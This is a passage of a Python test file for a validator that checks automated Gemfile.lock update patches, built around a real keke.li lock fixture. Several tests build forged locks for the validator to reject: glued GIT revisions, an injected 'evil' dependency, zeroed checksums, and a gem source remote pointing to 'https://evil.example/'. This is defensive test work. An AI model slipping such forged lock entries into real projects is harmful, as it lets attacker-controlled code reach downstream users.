    assert al.binding_problem(al.patch_filename(OTHER_FLEET_REPO), fleet_patch(repo=OTHER_FLEET_REPO, branch="stable"), branches) is None
    (tmp_path / "wrong-name.json").write_text(json.dumps(good))
    assert al.main(["--phase", "push", "--patches", str(tmp_path)]) == 1
    assert "file name does not match" in capsys.readouterr().out


def test_fetch_and_build_always_write_a_manifest_and_build_skips_it(tmp_path, capsys, monkeypatch):
    monkeypatch.setenv("GITHUB_TOKEN", TOKEN)
    repos = tmp_path / "repos.txt"
    repos.write_text("a/gone\n")
    monkeypatch.setattr(al.GitHub, "from_env", classmethod(lambda cls: object()))
    monkeypatch.setattr(al, "default_branch", lambda gh, repo: None)
    out = tmp_path / "w"
    assert al.main(["--phase", "fetch", "--repos", str(repos), "--out", str(out)]) == 1  # every repo failed...
    assert (out / "MANIFEST.txt").read_text() == "a/gone\n"  # ...yet the artifact is never empty
    monkeypatch.delenv("GITHUB_TOKEN")
    capsys.readouterr()
    assert al.main(["--phase", "build", "--in", str(out), "--patches", str(tmp_path / "p")]) == 0
    assert (tmp_path / "p" / "MANIFEST.txt").exists() and "meta.json" not in capsys.readouterr().out


# ------------------------------------------------------------------ round 4: structural comparison (real keke.li lock)
FIX = os.path.join(os.path.dirname(__file__), "fixtures")
KEKE_REPO = "BrightSoftwares/keke.li"
KEKE_ALLOWED = {KEKE_REPO.lower()}


def _fx(name):
    with open(os.path.join(FIX, name), encoding="utf-8") as fh:
        return fh.read()


def keke_patch(edit=None):
    """A realistic patch for the real keke.li lock (ffi, rexml below the matrix): bump the spec and checksum lines, add the
    `= version` DEPENDENCIES pins bundler writes, regenerate the Gemfile and summary. `edit(lock)` forges the after lock."""
    gf, lk = _fx("keke.li.Gemfile"), _fx("keke.li.before.Gemfile.lock")
    before = al.parse_lock(lk)
    upd = al.plan(before, M)["update"]
    out = lk
    for g in upd:
        out = out.replace(f"    {g} ({before[g]})\n", f"    {g} ({M['gems'][g]})\n")
        out = out.replace(f"  {g} ({before[g]}) sha256=", f"  {g} ({M['gems'][g]}) sha256=")
    deps = [f"  {g} (= {M['gems'][g]})" for g in upd]
    head, rest = out.split("\nDEPENDENCIES\n", 1)
    block, tail = rest.split("\n\n", 1)
    out = head + "\nDEPENDENCIES\n" + "\n".join(sorted(block.split("\n") + deps)) + "\n\n" + tail
    if edit:
        edited = edit(out)
        assert edited != out, "forgery edit did not apply"
        out = edited
    return {"repo": KEKE_REPO, "branch": "main", "before_gemfile": gf, "before_lock": lk,
            "after_gemfile": al.pin_gemfile(gf, {g: M["gems"][g] for g in upd}), "after_lock": out,
            "summary": ", ".join(f"{g} {before[g]}->{M['gems'][g]}" for g in upd), "ahead": ""}


def keke_problems(p):
    return al.patch_problems(p, M, KEKE_ALLOWED)


def test_structural_validator_accepts_the_legitimate_keke_patch_and_a_noop():
    assert keke_problems(keke_patch()) == []
    on_matrix = keke_patch()["after_lock"]
    assert al.lock_problems(on_matrix, on_matrix, M)[0] == []


@pytest.mark.parametrize("name", ["forged-variantB-keke.lock", "forged2c.lock"])
def test_reviewer_forged_locks_with_a_glued_git_section_are_rejected(name):
    # a GIT block with a different revision glued into the GEM chunk (no blank line): Bundler keeps the forged revision
    forged = _fx(name)
    assert "revision: 49f699f4c17e4736dd98c43dc03852b0ad5c3c35" in _fx("keke.li.before.Gemfile.lock")
    assert forged.count("  revision: ") == 2 and forged != _fx("keke.li.before.Gemfile.lock")
    p = keke_patch(lambda legit: forged)
    problems = keke_problems(p)
    assert problems, "forged lock accepted"
    assert any("source list" in x or "not preceded by an empty line" in x or "headers changed" in x for x in problems), problems


def test_section_header_without_a_preceding_empty_line_is_rejected_and_header_order_is_pinned():
    p = keke_patch(lambda l: l.replace("\n\nPLATFORMS\n", "\nPLATFORMS\n", 1))
    assert any("not preceded by an empty line" in x for x in keke_problems(p))
    swapped = keke_patch(lambda l: l.replace("\n\nCHECKSUMS\n", "\n\nPLATFORMS\n  ruby\n\nCHECKSUMS\n", 1))
    assert any("headers changed" in x for x in keke_problems(swapped))


def test_duplicate_lower_version_spec_next_to_the_real_one_is_rejected():
    p = keke_patch(lambda l: l.replace("    webrick (1.9.2)\n", "    webrick (1.7.0)\n    webrick (1.9.2)\n", 1))
    assert keke_problems(p)


def test_git_plugin_reassigned_to_rubygems_is_rejected():
    p = keke_patch(lambda l: l.replace("    webrick (1.9.2)\n", "    jekyll-obsidian-wikilinks (2.1.1)\n    webrick (1.9.2)\n", 1))
    problems = keke_problems(p)
    # Bundler's parser silently keeps the first of two identical name/version specs, so the text gate must catch it
    assert any("spec list length" in x for x in problems), problems


def test_dependency_line_added_under_a_matrix_gem_is_rejected():
    p = keke_patch(lambda l: l.replace("    jekyll (4.3.4)\n", "    jekyll (4.3.4)\n      evil (>= 0)\n", 1))
    assert keke_problems(p)
    q = keke_patch(lambda l: l.replace("    ffi (1.17.4)\n", "    ffi (1.17.4)\n      evil (>= 0)\n", 1))  # bumped gem too
    assert any("not in the lock" in x or "outside" in x for x in keke_problems(q))


def test_checksums_and_bundled_with_cannot_be_dropped_or_rewritten():
    gone = keke_patch(lambda l: l[: l.index("\nCHECKSUMS\n")] + "\n" + l[l.index("\nBUNDLED WITH\n") :].lstrip("\n").join(["", ""]))
    assert keke_problems(gone)
    zeros = keke_patch(lambda l: l.replace("  webrick (1.9.2) sha256=beb4a15f", "  webrick (1.9.2) sha256=00000000", 1))
    assert any("CHECKSUMS" in x for x in keke_problems(zeros))
    bw = keke_patch(lambda l: l.replace("BUNDLED WITH\n  4.0.10", "BUNDLED WITH\n  2.3.0", 1))
    assert any("BUNDLED WITH changed" in x for x in keke_problems(bw))
    ruby = keke_patch(lambda l: l.replace("BUNDLED WITH\n  4.0.10", "RUBY VERSION\n  ruby 2.0.0\n\nBUNDLED WITH\n  4.0.10", 1))
    assert keke_problems(ruby)


def test_bundled_with_allowlist_in_the_matrix_is_honoured():
    m = dict(M, allow_bundler="4.0.18")
    p = keke_patch(lambda l: l.replace("BUNDLED WITH\n  4.0.10", "BUNDLED WITH\n  4.0.18", 1))
    assert al.patch_problems(p, m, KEKE_ALLOWED) == []
    assert keke_problems(p)  # without the allowlist the same change is refused


def test_validator_fails_closed_without_ruby_or_on_timeout():
    def no_ruby(*a, **k):
        raise FileNotFoundError("ruby")

    def slow(*a, **k):
        raise al.subprocess.TimeoutExpired("ruby", 10)

    for runner, word in ((no_ruby, "not available"), (slow, "timed out")):
        problems = al.structure_problems(LOCK, LOCK, M, runner=runner)
        assert problems and word in problems[0]


def test_error_messages_echoing_lock_lines_are_capped():
    p = keke_patch(lambda l: l.replace("  remote: https://rubygems.org/\n", "  remote: https://evil.example/" + "a" * 100_000 + "\n", 1))
    problems = keke_problems(p)
    assert problems and all(len(x) < 400 for x in problems), max(len(x) for x in problems)


def test_exactly_one_remote_per_source_section():
    two = LOCK.replace("  remote: https://rubygems.org/\n", "  remote: https://rubygems.org/\n  remote: https://rubygems.org/\n", 1)
    assert any("exactly one required" in x for x in al.sources_problems(two, M))
